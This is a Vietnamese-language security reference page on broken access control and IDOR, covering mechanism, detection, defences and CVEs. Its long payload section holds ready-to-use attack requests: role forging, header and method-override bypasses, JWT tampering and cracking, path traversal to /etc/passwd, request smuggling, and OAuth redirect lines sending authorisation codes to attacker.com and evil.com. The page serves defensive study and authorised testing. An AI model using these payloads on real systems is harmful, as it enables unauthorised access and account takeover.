# Access Control Vulnerabilities

> Thiếu các kiểm tra phân quyền cho phép người dùng tiếp cận dữ liệu hoặc hành động không được phép. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/access_control.md`](../../../../Troubleshooting_Guide/access_control.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** IDOR / BAC · A01:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Phân quyền bị hỏng (broken access control) nghĩa là ứng dụng không thực thi được những gì một người dùng đã
xác thực (hoặc ẩn danh) được phép xem hoặc làm, nên họ tiếp cận dữ liệu hoặc hành động ngoài đặc quyền của mình.
Nó bao gồm leo thang theo chiều ngang (dữ liệu của người dùng khác, ví dụ IDOR) và leo thang theo chiều dọc
(tiếp cận chức năng admin), và đây là rủi ro web hàng đầu của OWASP.

## Cơ chế hoạt động (How it works)
Người dùng kiểm soát request — ID đối tượng, URL, phương thức HTTP, header, trường vai trò, và
thứ tự của các luồng nhiều bước — còn máy chủ thực thi phân quyền một cách yếu ớt hoặc sai chỗ.
Các thất bại phổ biến: tin tưởng một vai trò do client cung cấp (cookie `Admin=true`, `roleid`), chỉ thực thi
quyền truy cập ở UI hoặc theo URL tại một gateway front-end (bị vượt qua bằng `X-Original-URL` hoặc
ghi đè phương thức), kiểm tra quyền trên một kênh truyền nhưng không kiểm tra trên kênh khác (GraphQL, WebSocket),
hoặc tham chiếu các đối tượng bằng một ID mà không xác minh quyền sở hữu. Nguyên nhân gốc rễ là phân quyền
phía server bị thiếu hoặc đặt sai chỗ trên chính tài nguyên.

## Tác động (Impact)
Đọc hoặc sửa đổi trái phép dữ liệu của người dùng khác, leo thang lên các chức năng quản trị,
chiếm tài khoản, và các hành động phá hoại (xóa người dùng, thay đổi vai trò). Mức độ
thường là cao đến nghiêm trọng; ở quy mô lớn, IDOR trên các ID tuần tự có thể trích xuất mọi bản ghi trong
hệ thống.

## Cách phát hiện (How to detect)
- Thay đổi một định danh đối tượng (`?id=`, một GUID, một tên tệp) trả về dữ liệu của người dùng khác.
- Các URL admin tìm thấy trong `robots.txt` hoặc mã nguồn JS có thể truy cập được mà không cần quyền admin.
- Một hành động bị chặn lại thành công khi đổi phương thức (`GET`/`PUT`/`PATCH`) hoặc với
  các header `X-Original-URL`/`X-HTTP-Method-Override`.
- Một giá trị đặc quyền (`role`, `isAdmin`) gửi trong body của request được chấp nhận.
- Cùng một thao tác bị chặn qua REST lại thành công qua GraphQL hoặc WebSocket.
- Dữ liệu nhạy cảm xuất hiện trong body phản hồi đứng trước một redirect, hoặc trong một trường được điền sẵn.

## Khai thác (tóm tắt) (Exploitation)
Khám phá chức năng admin ẩn, rồi kiểm tra xem nó có thực sự được bảo vệ không. Đổi các định danh
đối tượng để đọc hoặc sửa đổi tài nguyên của người dùng khác (IDOR), giả mạo trạng thái vai trò phía client, và
vượt qua các gateway dựa trên URL/phương thức bằng các header ghi đè. Bỏ qua các bước được bảo vệ trong các luồng
nhiều giai đoạn, can thiệp các claim vai trò trong JWT, và xoay sang các kênh truyền thay thế (GraphQL/WebSocket) vốn
bỏ sót kiểm tra. Payload đầy đủ nằm ở mục Payload phía dưới.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Lựa chọn kỹ thuật theo loại kiểm soát (Technique selection by control type)

| Tình huống | Kỹ thuật |
|-----------|-----------|
| URL admin ẩn, không được bảo vệ | Khám phá qua `robots.txt` / mã nguồn JS |
| Vai trò từ cookie hoặc trường hồ sơ | Giả mạo cookie / mass-assign vai trò |
| Đối tượng được tham chiếu bằng ID trong request | IDOR — đổi định danh |
| Gateway front-end thực thi auth theo URL | Tiêm `X-Original-URL` / `X-Rewrite-URL` |
| POST tới hành động admin bị chặn | Ghi đè phương thức (GET/PUT/PATCH, header ghi đè) |
| Luồng admin nhiều bước | Bỏ qua bước được bảo vệ |
| Auth quyết định bởi `Referer` | Giả mạo header Referer |
| Vai trò dựa trên token | Can thiệp JWT / nhầm lẫn thuật toán |
| Cấp vai trò đồng thời | Race condition |

### Khám phá chức năng admin không được bảo vệ (Discovering unprotected admin functionality)
Các URL admin ẩn nhưng không được bảo vệ lộ ra trong các quy tắc disallow hoặc mã phía client.

```http
GET /robots.txt          # e.g. Disallow: /administrator-panel
GET /administrator-panel
GET /admin-f8h2k9        # unpredictable URL leaked in JS source
```

Liệt kê các endpoint admin ngay cả khi không có tài liệu:

```http
GET /api/admin/users
GET /api/admin/config
GET /api/v1/admin
GET /admin-api/users
OPTIONS /api/admin       # inspect Allow: GET, PUT, DELETE
```

### Trạng thái vai trò / đặc quyền có thể giả mạo (Forgeable role / privilege state)
Khi vai trò nằm trong một trường client có thể kiểm soát, hãy đặt nó trực tiếp.

```http
Cookie: Admin=true
GET /admin
```

```json
POST /api/user/update
{"email": "test@test.com", "roleid": 2}
```

### IDOR — can thiệp tham chiếu đối tượng trực tiếp (IDOR — direct object reference tampering)
Thay định danh bằng của một người dùng khác. GUID thường bị rò rỉ trong nội dung công khai (link tác giả, v.v.).

```http
GET /my-account?id=carlos
GET /my-account?id=administrator
GET /user?id=a1b2c3d4-e5f6-7890-abcd-ef1234567890
GET /download-transcript/1.txt        # sequential file IDOR
GET /download-transcript/2.txt
```

Biến đổi định dạng ID và phần mở rộng có thể né các kiểm tra ngây thơ:

```http
GET /order?id=123
GET /order?id=ORD-123
GET /order?id=0x7b
GET /user/123.json
GET /user/123.xml
```

Dữ liệu nhạy cảm cũng có thể rò rỉ trong một body phản hồi đứng trước một redirect, hoặc dưới dạng trường mật khẩu được điền sẵn:

```http
GET /my-account?id=carlos          # read body before the 302 — may contain {"apikey": "..."}
GET /my-account?id=administrator   # view source: <input type="password" value="admin123">
```

### Vượt phân quyền dựa trên URL và phương thức (URL- and method-based access control bypass)
Các gateway front-end phân quyền theo đường dẫn hoặc động từ HTTP có thể bị đánh lừa.

```http
GET / HTTP/1.1
X-Original-URL: /admin/delete?username=carlos
```
```http
GET / HTTP/1.1
X-Rewrite-URL: /admin/delete?username=carlos
```

Nếu phương thức nguy hiểm bị chặn, hãy thử các phương án khác hoặc các header ghi đè:

```http
GET /admin/upgrade?username=wiener
PUT /admin/upgrade?username=wiener
PATCH /admin/upgrade?username=wiener
```
```http
POST /admin/delete-user HTTP/1.1
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
```

### Tiến trình nhiều bước & kiểm tra dựa trên Referer (Multi-step process & Referer-based checks)
Nhảy thẳng tới một bước xác nhận không được bảo vệ, hoặc giả mạo `Referer` mà máy chủ tin tưởng.

```http
POST /admin/upgrade-user-confirm
{"username": "wiener", "confirmed": true}
```
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://vulnerable.com/admin
Cookie: session=wiener_session
```

### Leo thang đặc quyền dựa trên JWT (JWT-based privilege escalation)
Can thiệp các claim vai trò, rồi khai thác việc xác minh yếu (`alg:none`, nhầm lẫn RS256→HS256, hoặc secret yếu).

```json
{"user_id": 123, "role": "admin"}
```

```python
import jwt
jwt.decode(token, options={"verify_signature": False})
new_token = jwt.encode({"user_id": "admin", "role": "admin"},
                       open("public.pem").read(), algorithm="HS256")  # RS256 -> HS256
```

```bash
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt   # weak secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

### Parameter pollution & lạm dụng CORS (leo thang ngang) (Parameter pollution & CORS abuse)
Các định danh trùng lặp có thể phân giải về nạn nhân tùy theo stack; CORS quá dễ dãi cho phép ghi xuyên nguồn (cross-origin).

```http
POST /api/get_user_details
Content-Type: application/x-www-form-urlencoded

user_id=attacker&user_id=victim
# or: user_id[0]=attacker&user_id[1]=victim
```
```http
PUT /api/user HTTP/1.1
Origin: https://attacker.com
X-HTTP-Method-Override: DELETE
```

### Vượt phân quyền qua GraphQL & WebSocket (GraphQL & WebSocket authorization bypass)
Các kênh truyền thay thế thường bỏ qua các kiểm tra phân quyền ở tầng REST.

```graphql
query { user(id: "carlos") { apiKey password ssn } }
query { __schema { types { name fields { name type { name kind } } } } }
query { users { posts { author { password } } } }
```

```javascript
const ws = new WebSocket('wss://target/admin-ws');
ws.send(JSON.stringify({action: 'delete_user', username: 'carlos'}));
```

### Path traversal trong phân quyền (Path traversal in authorization)
Các tham số đường dẫn tệp không được giới hạn theo người dùng cho phép đọc các tài nguyên hạn chế.

```http
GET /api/files?path=../../admin/config.yml
GET /api/files?path=../../etc/passwd
```

### Race condition (TOCTOU) (Race conditions)
Bắn các request đồng thời để thắng khoảng trống giữa một kiểm tra phân quyền và việc sử dụng nó.

```bash
for i in {1..100}; do
  curl -X POST https://target/api/upgrade-role -d "username=carlos" &
done
wait
```

### Request smuggling để tới panel admin (Request smuggling to reach the admin panel)
Một desync H2.CL có thể chèn trước một request admin vượt qua kiểm soát front-end.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 58
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X: 
```

### Chuẩn hóa Unicode trong giá trị vai trò (Unicode normalization in role values)
Null byte hoặc homoglyph có thể luồn một giá trị đặc quyền qua một denylist vốn chuẩn hóa muộn hơn.

```json
POST /api/user/update
{"role": "\x00admin"}
{"role": "Аdmin"}        # Cyrillic 'А' instead of Latin 'A'
```

### IDOR kênh phụ (khôi phục tài khoản) (Secondary-channel IDOR)
Token đặt lại dự đoán được hoặc email khôi phục do kẻ tấn công đặt cho phép chiếm tài khoản ngoài luồng chính.

```http
POST /reset-password
{"token": "predictable_token", "new_password": "hacked123"}
```
```http
PUT /api/user/profile
{"email": "attacker@evil.com"}        # then trigger a reset to the new address
```

### Rò rỉ token OAuth / SSRF (OAuth / SSRF token leakage)
Thao túng redirect-URI và các open redirect trong callback trích xuất các mã ủy quyền.

```http
GET /auth?redirect_uri=https://attacker.com/callback&client_id=app&response_type=code
GET /callback?code=xxx&redirect=https://evil.com
```

## Phòng chống (Defenses)
1. **Từ chối mặc định** — mọi tài nguyên và hành động đều cần một sự cho phép tường minh; các endpoint mới
   không thể truy cập được cho tới khi quyền được cấp.
2. **Thực thi phía server, trên tài nguyên** — kiểm tra phân quyền ở backend cho mọi
   request, không phải ở UI hay tại một URL gateway; xác minh quyền *sở hữu* đối tượng, không chỉ việc xác thực.
3. **Không bao giờ tin tưởng vai trò/danh tính do client cung cấp** — suy ra vai trò và người dùng từ phiên server,
   bỏ qua `role`/`isAdmin`/`roleid` trong các request, và dùng các tham chiếu đối tượng không đoán được, giới hạn theo quyền sở hữu.
4. **Áp dụng kiểm tra trên mọi kênh truyền và phương thức** — REST, GraphQL, WebSocket, và mọi động từ HTTP
   phải dùng chung một tầng phân quyền; bỏ qua các header `X-Original-URL`/ghi đè phương thức.
5. **Tập trung hóa và kiểm thử** — dùng một cơ chế phân quyền duy nhất, được kiểm thử kỹ thay vì
   kiểm tra theo từng handler; thêm các test tự động cho leo thang ngang và dọc.
6. **Ghi log và giới hạn tốc độ** các thất bại phân quyền để phát hiện việc liệt kê và các đợt quét IDOR.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Access+Control+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Access+Control+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=Access+Control+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=Access+Control+Vulnerabilities
- **OSV** — https://osv.dev/list?q=Access+Control+Vulnerabilities
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `Access Control Vulnerabilities <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2021-22986` — F5 BIG-IP iControl REST cho phép truy cập không cần xác thực tới chức năng admin.
- `CVE-2023-22515` — broken access control trong Atlassian Confluence cho phép tạo tài khoản admin.
- `CVE-2019-11510` — vượt path-traversal/phân quyền trong Pulse Secure làm lộ các tệp nhạy cảm.

## Tham khảo (References)
- PortSwigger Web Security Academy — Access control vulnerabilities.
- OWASP — Authorization Cheat Sheet & Insecure Direct Object Reference Prevention Cheat Sheet.
- OWASP — A01:2021 Broken Access Control.
